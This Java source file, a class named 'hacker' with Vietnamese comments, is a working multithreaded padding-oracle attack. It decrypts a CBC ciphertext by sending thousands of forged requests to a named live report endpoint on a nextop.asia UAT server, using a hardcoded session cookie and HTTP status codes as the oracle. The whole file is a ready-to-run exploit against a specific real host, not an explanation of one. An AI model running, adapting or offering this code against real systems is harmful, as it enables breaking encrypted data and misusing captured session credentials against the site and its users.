package nextop.sam2.mypage.bootstrap;

import java.io.IOException;
import java.net.URI;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.*;

public class hacker {
    private static final int BLOCK_SIZE = 16;
    private static final int THREAD_POOL_SIZE = 32;

    private static final HttpClient client = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_1_1)
            .connectTimeout(Duration.ofSeconds(5))
            .build();

    // Hàm oracle kết nối trực tiếp với method kiểm tra padding
    private static boolean oracle(byte[] modifiedPrev, byte[] targetBlock) {
        try {
            // 1. Ghép modifiedPrev và targetBlock lại thành ciphertext giả mạo
            byte[] cipherBytes = new byte[modifiedPrev.length + targetBlock.length];
            System.arraycopy(modifiedPrev, 0, cipherBytes, 0, modifiedPrev.length);
            System.arraycopy(targetBlock, 0, cipherBytes, modifiedPrev.length, targetBlock.length);

            // 2. Encode sang Base64 chuẩn
            String encoded = URLEncoder.encode(URLEncoder.encode(Base64.getEncoder().encodeToString(cipherBytes), StandardCharsets.UTF_8), StandardCharsets.UTF_8);


                try {

                    String url = "https://uat-oci-my-min.nextop.asia/rest/report/check-link?"
                            + "accountType=21"
                            + "&link=" + encoded
                            + "&reportDate=2026%2F11%2F11"
                            + "&reportId=1424828535888959253"
                            + "&reportType=2"
                            + "&title=%E5%8F%96%E5%BC%95%E5%A0%B1%E5%91%8A%E6%9B%B8%E5%85%BC%E6%AE%8B%E9%AB%98%E5%A0%B1%E5%91%8A%E6%9B%B8(%E6%9C%88%E6%AC%A1)";

                    HttpRequest request = HttpRequest.newBuilder()
                            .header("Cookie", "JSESSIONID=ZGFhZmIyMWQtOTM0YS00MWVkLTliNjMtMjU0N2VlYjU2NmMy")
                            .uri(URI.create(url))
                            .timeout(Duration.ofSeconds(3))
                            .GET()
                            .build();

                    HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                    int statusCode = response.statusCode();


                    return statusCode == 200;

                } catch (Exception e) {
                    return false;
                }



        } catch (Exception e) {
            return false;
        }
    }

        private static class DecryptResult {
        byte[] decryptedBlock;
        byte[] intermediateState;

        public DecryptResult(byte[] decryptedBlock, byte[] intermediateState) {
            this.decryptedBlock = decryptedBlock;
            this.intermediateState = intermediateState;
        }
    }

    private static DecryptResult decryptBlock(byte[] prevBlock, byte[] targetBlock) {
        byte[] decryptedBlock = new byte[BLOCK_SIZE];
        byte[] intermediateState = new byte[BLOCK_SIZE];
        ExecutorService executor = Executors.newFixedThreadPool(THREAD_POOL_SIZE);

        for (int byteIdx = BLOCK_SIZE - 1; byteIdx >= 0; byteIdx--) {
            int paddingValue = BLOCK_SIZE - byteIdx;
            byte[] modifiedPrev = new byte[BLOCK_SIZE];

            for (int i = byteIdx + 1; i < BLOCK_SIZE; i++) {
                modifiedPrev[i] = (byte) (intermediateState[i] ^ paddingValue);
            }

            CompletionService<Integer> pool = new ExecutorCompletionService<>(executor);
            int submittedTasks = 0;

            for (int guess = 0; guess < 256; guess++) {
                final int g = guess;
                final byte[] testPrev = modifiedPrev.clone();
                testPrev[byteIdx] = (byte) g;

                pool.submit(() -> {
                    if (oracle(testPrev, targetBlock)) {
                        return g;
                    }
                    return null;
                });
                submittedTasks++;
            }

            boolean found = false;
            try {
                for (int i = 0; i < submittedTasks; i++) {
                    Future<Integer> future = pool.poll(10, TimeUnit.SECONDS);
                    if (future != null) {
                        Integer result = future.get();
                        if (result != null && !found) {
                            int guess = result;
                            intermediateState[byteIdx] = (byte) (guess ^ paddingValue);
                            decryptedBlock[byteIdx] = (byte) (intermediateState[byteIdx] ^ prevBlock[byteIdx]);
                            found = true;
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            if (!found) {
                System.err.println("[-] Không tìm thấy giá trị phù hợp cho byte index: " + byteIdx);
            }
        }
        executor.shutdown();
        return new DecryptResult(decryptedBlock, intermediateState);
    }

    private static byte[] removePKCS7Padding(byte[] data) {
        if (data == null || data.length == 0) return data;
        int paddingLength = data[data.length - 1] & 0xFF;
        if (paddingLength > 0 && paddingLength <= BLOCK_SIZE) {
            for (int i = data.length - paddingLength; i < data.length; i++) {
                if ((data[i] & 0xFF) != paddingLength) {
                    return data;
                }
            }
            return Arrays.copyOf(data, data.length - paddingLength);
        }
        return data;
    }

    public static void main(String[] args) {
        System.out.println("=== GIẢI MÃ PADDING ORACLE (TỰ ĐỘNG TÍNH NGƯỢC BLOCK 1 TỪ BLOCK 2) ===");

        String doubleUrlEncodedCipher = "j8IAvIsaU9Zv7SHfZX%2B6Nsy0HbE70JQ49lNu1VpuYIvVCRr1uSCjmrXfglyUo12zXMMmHW6ZDJOARwHi3XxnbfpCWgLV7TVMbMKOOqT4vrsiEEiR%2BeCDPhgDSslgSDS%2BzVrAp1IGj7LOYKtZeLpCkw%3D%3D";
        try {
            String cleanBase64 = URLDecoder.decode(doubleUrlEncodedCipher, StandardCharsets.UTF_8);
            byte[] fullCiphertext = Base64.getDecoder().decode(cleanBase64);
            int totalBlocks = fullCiphertext.length / BLOCK_SIZE;

            System.out.println("[+] Tổng số blocks phát hiện: " + totalBlocks);

            if (totalBlocks < 2) {
                System.out.println("[-] Ciphertext quá ngắn.");
                return;
            }

            byte[] decryptedBytes = new byte[totalBlocks * BLOCK_SIZE];
            long startTime = System.currentTimeMillis();

            byte[] intermediateBlock2 = null;
            byte[] plaintextBlock2 = null;

            // 1. Giải mã từ block cuối cùng lùi về Block 2
            for (int blockIdx = totalBlocks; blockIdx >= 2; blockIdx--) {
                System.out.println("[*] Đang giải mã block thứ " + blockIdx + "/" + totalBlocks + "...");

                byte[] prevBlock = Arrays.copyOfRange(fullCiphertext, (blockIdx - 2) * BLOCK_SIZE, (blockIdx - 1) * BLOCK_SIZE);
                byte[] targetBlock = Arrays.copyOfRange(fullCiphertext, (blockIdx - 1) * BLOCK_SIZE, blockIdx * BLOCK_SIZE);

                DecryptResult res = decryptBlock(prevBlock, targetBlock);

                // Ghi vào mảng kết quả
                System.arraycopy(res.decryptedBlock, 0, decryptedBytes, (blockIdx - 1) * BLOCK_SIZE, BLOCK_SIZE);

                // Lưu lại kết quả của Block 2 để tính ngược ra Block 1
                if (blockIdx == 2) {
                    intermediateBlock2 = res.intermediateState;
                    plaintextBlock2 = res.decryptedBlock;
                }
            }

            // 2. [ĐƯỜNG TẮT TOÁN HỌC] Tính ngược Block 1 từ Intermediate và Plaintext của Block 2
            if (intermediateBlock2 != null && plaintextBlock2 != null) {
                System.out.println("[*] Đang tính ngược Block 1 (IV) từ dữ liệu Block 2...");
                byte[] realBlock1 = new byte[BLOCK_SIZE];

                for (int i = 0; i < BLOCK_SIZE; i++) {
                    // Công thức chuẩn: Block_1 = Intermediate_2 ^ Plaintext_2
                    realBlock1[i] = (byte) (intermediateBlock2[i] ^ plaintextBlock2[i]);
                }

                // Ghi đè Block 1 vào vị trí đầu tiên (index 0) của mảng kết quả
                System.arraycopy(realBlock1, 0, decryptedBytes, 0, BLOCK_SIZE);
                System.out.println("[+] Khôi phục hoàn tất Block 1 chuẩn xác!");
            }

            long endTime = System.currentTimeMillis();
            byte[] cleanBytes = removePKCS7Padding(decryptedBytes);
            String rawResult = new String(cleanBytes, StandardCharsets.UTF_8);

            System.out.println("\n[+] GIẢI MÃ TOÀN BỘ THÀNH CÔNG!");
            System.out.println("[+] Thời gian thực thi: " + (endTime - startTime) / 1000.0 + " giây");
            System.out.println("[+] Nội dung giải mã hoàn chỉnh: " + rawResult);

        } catch (Exception e) {
            System.err.println("[-] Lỗi: " + e.getMessage());
            e.printStackTrace();
        }
    }
}